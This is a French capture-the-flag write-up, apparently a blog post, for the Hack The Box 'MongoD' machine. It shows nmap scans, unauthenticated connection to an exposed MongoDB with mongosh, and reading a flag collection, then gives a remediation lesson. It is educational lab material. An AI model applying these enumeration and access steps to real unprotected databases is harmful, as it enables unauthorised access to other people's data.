---
title: "MongoD"
date: 2026-01-15
description: "Découverte d'un service de base de données NoSQL."
draft: false

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Database", "Nmap", "MongoDB", "Linux", "VIP", "Tier 0"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

Bienvenue pour cette septième étape de notre parcours **Starting Point**. Aujourd’hui, on s’attaque à **MongoD**. Comme son nom l’indique, on va mettre les mains dans le cambouis avec **MongoDB**, une base de données **NoSQL** extrêmement populaire.

>[!TIP]
Attention : Il s’agit d’une machine VIP. Vous aurez besoin d’un abonnement HTB pour pouvoir la lancer.

Le scénario est un grand classique du “fail” en sysadmin, une base de données ultra-performante, mais dont la porte a été laissée grande ouverte sans aucun verrou (authentification).

>[!WARNING]
>Dans ce writeup, je ne publie pas directement le flag final, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
>**NOTE :** n’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Je sortirais bientot un tuto vidéo, d'ici la tu peux aller checker ma chaine Youtube :
{{< button href="https://www.youtube.com/@Raven_Breach/videos" target="_blank" >}}
{{< icon "youtube" >}} RavenBreach
{{< /button >}}

---

## Reconnaissance

### Découverte d’hôte

On commence par vérifier la connectivité avec un ``ping``.
````bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.228.30

PING 10.129.228.30 (10.129.228.30) 56(84) bytes of data.
64 bytes from 10.129.228.30: icmp_seq=1 ttl=63 time=59.3 ms
64 bytes from 10.129.228.30: icmp_seq=2 ttl=63 time=81.8 ms
64 bytes from 10.129.228.30: icmp_seq=3 ttl=63 time=72.2 ms
^C
--- 10.129.228.30 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2006ms
rtt min/avg/max/mdev = 59.309/71.118/81.816/9.222 ms
````
Ça répond. On peut passer à l’étape suivante.

### Service enumération
Lançons un scan ``nmap`` classique pour voir ce qui est exposé.
````bash
┌─[user@parrot]─[~]
└──╼ $nmap -sV 10.129.228.30

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-12 13:10 UTC
Nmap scan report for 10.129.228.30
Host is up (0.053s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect res
````

Seulement du **SSH** ? C’est louche. Sur ces machines de niveau **débutant**, le **SSH** est rarement le point d’entrée. On va donc forcer avec un scan beaucoup plus agressif sur **tous les ports** (``-p-``) en boostant la vitesse ( ``--min-rate``).
````bash
┌─[user@parrot]─[~]
└──╼ $nmap -p- --min-rate=100 -sV 10.129.228.30

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-12 13:13 UTC
Nmap scan report for 10.129.228.30
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongod?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port27017-TCP:V=7.94SVN%I=7%D=12/12%Time=693C15AD%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,A9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x2
SF:0like\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTT
SF:P\x20on\x20the\x20native\x20driver\x20port\.\r\n")%r(FourOhFourRequest,
SF:A9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20
SF:text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x
SF:20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the
SF:\x20native\x20driver\x20port\.\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.27 seconds
````
---

## Pré-Exploitation
### Installation des outils
Pour parler à MongoDB, il nous faut le client officiel : **mongosh**.

>[!TIP]
**NOTE** : Sur cette machine, il est conseillé d'utiliser une version spécifique (comme la 2.3.2) pour éviter les problèmes de compatibilité avec les vieilles instances MongoDB.

Donc on télécharge mongosh 2.3.2
````bash
┌─[user@parrot]─[~]
└──╼ $curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 78.4M  100 78.4M    0     0  21.7M      0  0:00:03  0:00:03 --:--:-- 21.7M
````
Ensuite on le décompresse
````bash
┌─[user@parrot]─[~]
└──╼ $tar xvf mongosh-2.3.2-linux-x64.tgz

mongosh-2.3.2-linux-x64/
mongosh-2.3.2-linux-x64/.sbom.json
mongosh-2.3.2-linux-x64/LICENSE-crypt-library
mongosh-2.3.2-linux-x64/LICENSE-mongosh
mongosh-2.3.2-linux-x64/README
mongosh-2.3.2-linux-x64/THIRD_PARTY_NOTICES
mongosh-2.3.2-linux-x64/bin/
mongosh-2.3.2-linux-x64/mongosh.1.gz
mongosh-2.3.2-linux-x64/bin/mongosh
````
---

## Exploitation

### Connexion à la base de données

Maintenant allons a l’endroit ou est l’utilitaire et tentons une connexion.
````bash
┌─[user@parrot]─[~]
└──╼ $cd mongosh-2.3.2-linux-x64/bin

┌─[✗]─[user@parrot]─[~/mongosh-2.3.2-linux-x64/bin]
└──╼ $./mongosh mongodb://10.129.228.30:27017

Current Mongosh Log ID: 693c1dd99e268f09ebfe6910
Connecting to:  mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+2.3.2
Using MongoDB:  3.6.8
Using Mongosh:  2.3.2
mongosh 2.5.10 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://www.mongodb.com/docs/mongodb-shell/


To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

------
   The server generated these startup warnings when booting
   2025-12-12T13:04:47.332+0000: 
   2025-12-12T13:04:47.332+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2025-12-12T13:04:47.332+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2025-12-12T13:04:48.771+0000: 
   2025-12-12T13:04:48.771+0000: ** WARNING: Access control is not enabled for the database.
   2025-12-12T13:04:48.771+0000: **          Read and write access to data and configuration is unrestricted.
   2025-12-12T13:04:48.771+0000:
------

test> 
````
Une fois dedans, on reçoit un avertissement qui devrait faire trembler n’importe quel admin : **WARNING: Access control is not enabled for the database**. Cela signifie que nous avons les pleins pouvoirs (Lecture/Écriture) sans mot de passe.

### Fouille des données
C’est le moment de jouer avec les **commandes MongoDB**. On commence par lister les bases disponibles avec **show dbs**.
````bash
test> show dbs

admin                   32.00 KiB
config                 108.00 KiB
local                   72.00 KiB
sensitive_information   32.00 KiB
users                   32.00 KiB
````
La base **sensitive_information** porte un nom beaucoup trop tentant. Selectionnons la avec la commande ``use`` suivi du nom de la db
````bash
test> use sensitive_information

switched to db sensitive_informatio
````

Ensuite, on affiche les **collections** (l’équivalent des tables dans une base SQL) avec la commande ``show collections``

````bash
sensitive_information> show collections

flag
````
Il ne reste plus qu’à lire le contenu de la collection **flag** avec la fonction ``.find()``:
````bash
sensitive_information> db.flag.find()

[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6{...}6ea'
  }
]
````
Et voilà ! Le flag est extrait avec succès.

---

## Post-Exploitation
Qu’est-ce qui s’est passé ici ? **MongoDB**, dans ses anciennes configurations ou via une mauvaise installation, ne limite pas l’accès aux interfaces réseaux. Si l’administrateur n’active pas le **RBAC** (Role-Based Access Control), le serveur accepte n’importe quelle connexion entrante.

Leçon du jour : Une base de données ne doit JAMAIS être exposée sur le réseau public sans une authentification robuste et, idéalement, un accès limité par IP (Whitelist).

La machine est ***pwned*** !